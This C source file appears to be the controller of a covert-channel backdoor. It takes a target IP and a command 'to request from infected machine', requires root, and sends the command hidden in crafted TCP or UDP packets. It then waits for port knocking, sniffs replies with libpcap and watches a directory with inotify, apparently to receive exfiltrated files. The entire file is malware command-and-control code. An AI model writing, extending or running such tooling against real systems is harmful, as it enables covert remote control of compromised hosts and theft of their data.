#include <getopt.h>
#include <pthread.h>
#include "../src/encrypt_utils.h"
#include "../src/socketwrappers.h"
#include "../src/covert_wrappers.h"
#include "../src/inotify.h"
#include "../src/libpcap.h"

static void print_usage(void) {
    puts ("Usage options: \n"
            "\t--nic       -   network interface to use\n"
            "\t--target    -   target machine to attack\n"
            "\t--command   -   command to request from infected machine\n"
            "\t--local     -   your local ip\n"
            "\t--tcp       -   use TCP protocol\n"
            "\t--directory -   directory to watch\n"
            "\t--file      -   file to watch\n");
}

static struct option long_options[] = {
    {"nic",       required_argument,  0,  0 },
    {"target",    required_argument,  0,  1 },
    {"command",   required_argument,  0,  2 },
    {"local",     required_argument,  0,  3 },
    {"tcp",       optional_argument,  0,  4 },
    {"directory", required_argument,  0,  5 },
    {"file",      required_argument,  0,  6 },
    {0,         0,                  0,  0 }
};



int main(int argc, char **argv){
    pthread_t inotify_thread;
    int arg;
    char *nic;
    char targetip[BUFSIZ];
    char localip[BUFSIZ];
    char data[BUFSIZ];
    char pcapfilter[BUFSIZ];
    char file[BUFSIZ];
    char directory[BUFSIZ];
    struct filter Filter;
    bool tcp = false;
    /* make sure user has root privilege */
    if(geteuid() != 0) {
        printf("Must run as root\n");
        exit(1);
    }

    while (1) {
        int option_index = 0;

        arg = getopt_long(argc, argv, "", long_options, &option_index);

        if(arg == -1) {
            break;
        }

        switch (arg) {
            case 0:
                /*strncpy(nic, optarg, BUFFERSIZE);
                printf("Using NIC: %s\n", nic);*/
                break;
            case 1:
                strncpy(targetip, optarg, BUFSIZ);
                //printf("Target ip %s\n", targetip);
                break;
            case 2:
                strncpy(data,optarg, BUFSIZ);
                printf("Command %s\n", data);
                break;
            case 3:
                strncpy(localip, optarg, BUFSIZ);
                //printf("Local ip %s\n", localip);
                break;
            case 4:
                tcp = true;
                break;
            case 5:
                strncpy(directory, optarg, BUFSIZ);
                printf("Directory: %s\n", directory);
                break;
            case 6:
                strncpy(file, optarg, BUFSIZ);
                printf("File: %s\n", file);
                break;
            default: /*  '?' */
                print_usage();
                exit(1);
        }
    }
    inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
    strncpy(inotify_args->file, file, BUFSIZ);
    strncpy(inotify_args->targetip, targetip, BUFSIZ);
    strncpy(inotify_args->localip, localip, BUFSIZ);
    strncpy(inotify_args->directory, directory, BUFSIZ);
    inotify_args->tcp = tcp;
    pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);


    Filter = InitFilter(targetip,localip,false);
    CreateFilter(Filter, pcapfilter,tcp);
    printf("Filter: %s\n",pcapfilter);
	if(tcp){
        covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
    } else {
        covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
    }
	//wait for port knocking
	Packetcapture(pcapfilter,Filter,tcp);
	pthread_join(inotify_thread, NULL);
    return 0;
}
